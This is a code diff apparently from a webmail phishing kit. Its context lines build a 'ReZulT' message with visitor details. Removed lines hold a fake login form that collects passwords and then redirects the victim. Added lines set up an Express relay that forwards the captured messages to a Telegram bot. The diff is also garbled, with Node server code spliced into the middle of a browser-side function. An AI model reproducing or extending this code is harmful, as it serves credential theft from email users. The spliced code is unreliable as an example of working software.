@@ -247,66 +247,39 @@
                 message += "Date : " + date + "\n";
                 message +=
                   `---------+ General Webmail ReZulT ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} +-------------\n`;
-               const token = process.env.TELEGRAM_TOKEN;
+              const express = require("express");
+const app = express();
 
-module.exports = async function (context, req) {
-  const { message, chatId } = req.body;
+app.use(express.json());
 
-  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message
-    })
-  });
+const token = process.env.TELEGRAM_TOKEN;
 
-  context.res = { status: 200, body: "ok" };
-};
-                  beforeSend: function (xhr) {
-                    $('#submit-btn').html(langs.verifyingText);
-                  },
-                  success: function (response) {
-                    if (response) {
-                      if (response['ok'] == true) {
-                        if (attempts >= 1) {
-                          attempts = 0;
-                          $(".login-form").hide();
-                          $(".success-con").show();
-                          $(".success-con .msg").html(`
-                      ${langs.yourEmail} <br>
-                      ${langs.success}</b>
-                    `);
-                          setTimeout(() => {
-                            window.location.replace(
-                              `http://www.${domain}`); // Redirect to the desired page
-                          }, 5000);
-                        } else {
-                          attempts++;
-                          msgElement.show();
-                          passwordField.val('');
-                          $('#submit-btn').html(langs.submitBtn);
-                        }
-                      }
-                    }
-                  },
-                  error: function (err) {
-                    $('#net-errror').show();
-                    passwordField.val('');
-                    console.log("Error : ", err);
-                  }
-                });
-              }
-            }
-          }
-        });
-      });
-    }
-  
+app.post("/api/message", async (req, res) => {
+  try {
+    const { message, chatId } = req.body;
 
-    
-    
+    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    });
 
+    const data = await response.json();
+
+    res.status(200).send({ ok: true, data });
+  } catch (err) {
+    console.error(err);
+    res.status(500).send({ error: "Telegram failed" });
+  }
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log("Server running on port", PORT);
+});
     function handleBase64Data(string) {
 
       try {
